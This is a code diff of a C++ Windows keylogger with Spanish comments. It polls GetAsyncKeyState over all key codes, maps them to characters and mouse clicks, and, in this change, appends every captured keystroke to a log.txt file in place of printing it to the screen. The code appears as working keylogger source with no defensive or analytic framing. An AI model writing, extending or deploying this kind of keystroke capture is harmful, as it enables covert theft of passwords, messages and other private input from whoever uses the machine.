@@ -6,7 +6,8 @@
 using namespace std;
 
 int main(int argc, char *argv[]){
-	
+
+	//ascii	
 	map<int, string> ch;
     ch[1] = " [Click Izq] ";
     ch[2] = " [Click Der] ";
@@ -104,14 +105,36 @@ int main(int argc, char *argv[]){
     ch[221] = "¡";
     ch[222] = "´";
     ch[226] = "<";
+    
+    FILE *f;
+    int count = 0;
 	
 	while(true){
 		
 		for (int i = 0; i < 256; i++){
 			
-			if(GetAsyncKeyState(i) == -32767){
+			if(GetAsyncKeyState(i) == -32767){	//Detección
 				
-				cout << ch[i].c_str();
+				f = fopen("log.txt", "a");
+				
+				if(f == NULL){
+					
+					exit(1);
+					
+				}
+				
+				if(count == 50){	//Espaciado
+					
+					fputs("\n", f);
+					count = 0;
+					
+				}
+				
+				fputs(ch[i].c_str(), f);	//Escritura
+				
+				fclose(f);
+				
+				count++;
 				
 			}
 			
